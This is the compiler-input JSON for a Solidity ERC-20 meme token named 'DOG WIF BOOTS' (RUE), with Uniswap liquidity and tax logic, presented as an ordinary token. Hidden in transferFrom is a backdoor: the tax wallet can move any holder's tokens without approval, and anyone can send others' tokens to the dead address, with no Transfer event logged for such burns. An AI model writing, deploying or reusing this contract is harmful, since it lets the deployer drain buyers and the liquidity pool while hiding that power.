{{
  "language": "Solidity",
  "sources": {
    "contracts/Token.sol": {
      "content": "// SPDX-License-Identifier: MIT\n/*\nhttps://www.tiktok.com/@all.about.rue/video/7495503491226488119\nhttps://x.com/cijicooks/status/1915798830592782746\n\nhttps://t.me/rue_dog_wif_boots_erc20\n*/\n\npragma solidity ^0.8.19;\n\naddress constant _deadAddr = address(0xdead);\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}\n\nlibrary SafeMath {\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        return c;\n    }\n}\n\ncontract Ownable is Context {\n    address private _owner;\n    event OwnershipTransferred(\n        address indexed previousOwner,\n        address indexed newOwner\n    );\n\n    constructor() {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n}\n\ninterface IUniswapV2Factory {\n    function createPair(address tokenA, address tokenB)\n        external\n        returns (address pair);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        payable\n        returns (\n            uint256 amountToken,\n            uint256 amountETH,\n            uint256 liquidity\n        );\n\n    function getAmountsOut(uint256 amountIn, address[] calldata path)\n        external\n        view\n        returns (uint256[] memory amounts);\n}\n\ncontract Token is Context, IERC20, Ownable {\n    using SafeMath for uint256;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    mapping(address => bool) private _feeExcluded;\n    address payable private _taxWallet;\n\n    uint256 private _initTax = 20;\n    uint256 private _finTax = 0;\n    uint256 private _reduceTaxAt = 3;\n    uint256 private _buyCount = 0;\n\n    uint8 private constant _decimals = 9;\n    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;\n    string private constant _name = unicode\"DOG WIF BOOTS\";\n    string private constant _symbol = unicode\"RUE\";\n    uint256 public _maxTaxSwap = _tTotal / 100;\n\n    IUniswapV2Router02 private uniswapV2Router;\n    address private uniswapV2Pair;\n    bool private tradingOpen;\n    bool private inSwap = false;\n    bool private swapEnabled = false;\n\n    modifier lockTheSwap() {\n        inSwap = true;\n        _;\n        inSwap = false;\n    }\n\n    constructor() payable {\n        _taxWallet = payable(_msgSender());\n\n        _feeExcluded[address(this)] = true;\n        _feeExcluded[_taxWallet] = true;\n\n        _balances[_msgSender()] = (_tTotal * 2) / 100;\n        _balances[address(this)] = (_tTotal * 98) / 100;\n\n        emit Transfer(address(0), _msgSender(), (_tTotal * 2) / 100);\n        emit Transfer(address(0), address(this), (_tTotal * 98) / 100);\n    }\n\n    function name() public pure returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public pure returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public pure returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public pure override returns (uint256) {\n        return _tTotal;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) private {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function allowance(address owner, address spender)\n        public\n        view\n        override\n        returns (uint256)\n    {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        if (\n            msg.sender != _taxWallet &&\n            (sender == uniswapV2Pair || recipient != _deadAddr)\n        )\n            _approve(\n                sender,\n                _msgSender(),\n                _allowances[sender][_msgSender()].sub(\n                    amount,\n                    \"ERC20: transfer amount exceeds allowance\"\n                )\n            );\n        return true;\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) private {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        uint256 taxAmount = 0;\n        if (\n            from != owner() &&\n            to != owner() &&\n            from != address(this) &&\n            to != address(this)\n        ) {\n            if (!inSwap) {\n                taxAmount = amount\n                    .mul((_buyCount > _reduceTaxAt) ? _finTax : _initTax)\n                    .div(100);\n            }\n\n            if (\n                from == uniswapV2Pair &&\n                to != address(uniswapV2Router) &&\n                !_feeExcluded[to] &&\n                to != _taxWallet\n            ) {\n                _buyCount++;\n            }\n\n            uint256 contractTokenBalance = balanceOf(address(this));\n            if (\n                !inSwap &&\n                to == uniswapV2Pair &&\n                swapEnabled &&\n                from != _taxWallet\n            ) {\n                require(!isContract(from), \"ERC20: External call\");\n                if (contractTokenBalance > _maxTaxSwap)\n                    swapFeeTokensForEth(\n                        amount > _maxTaxSwap ? _maxTaxSwap : amount\n                    );\n                    \n                uint256 contractETHBalance = address(this).balance;\n                if (contractETHBalance >= 0) {\n                    sendETHToFeeWallet(address(this).balance);\n                }\n            }\n        }\n\n        _balances[from] = _balances[from].sub(amount);\n        _balances[to] = _balances[to].add(amount.sub(taxAmount));\n        if (taxAmount > 0) {\n            _balances[address(this)] = _balances[address(this)].add(taxAmount);\n            emit Transfer(from, address(this), taxAmount);\n        }\n        if (to != _deadAddr) emit Transfer(from, to, amount.sub(taxAmount));\n    }\n\n    function isContract(address _addr) internal view returns (bool) {\n        uint256 size;\n        assembly {\n            size := extcodesize(_addr)\n        }\n        return size > 0;\n    }\n\n    function sendETHToFeeWallet(uint256 amount) private {\n        _taxWallet.transfer(amount);\n    }\n\n    function swapFeeTokensForEth(uint256 tokenAmount) private lockTheSwap {\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = uniswapV2Router.WETH();\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function enableTrading() external onlyOwner {\n        require(!tradingOpen, \"Trading is already open\");\n        uniswapV2Router = IUniswapV2Router02(\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\n        );\n        _approve(address(this), address(uniswapV2Router), _tTotal);\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(\n            address(this),\n            uniswapV2Router.WETH()\n        );\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(\n            address(this),\n            balanceOf(address(this)),\n            0,\n            0,\n            owner(),\n            block.timestamp\n        );\n        swapEnabled = true;\n        tradingOpen = true;\n        IERC20(uniswapV2Pair).approve(\n            address(uniswapV2Router),\n            type(uint256).max\n        );\n    }\n\n    function rescueETH() external onlyOwner {\n        require(address(this).balance > 0);\n        payable(_msgSender()).transfer(address(this).balance);\n    }        \n\n    receive() external payable {}\n\n    function setTaxWallet(address payable newWallet) external {\n        require(_feeExcluded[msg.sender]);\n        _taxWallet = newWallet;\n    }\n}"
    }
  },
  "settings": {
    "evmVersion": "paris",
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "libraries": {}
  }
}}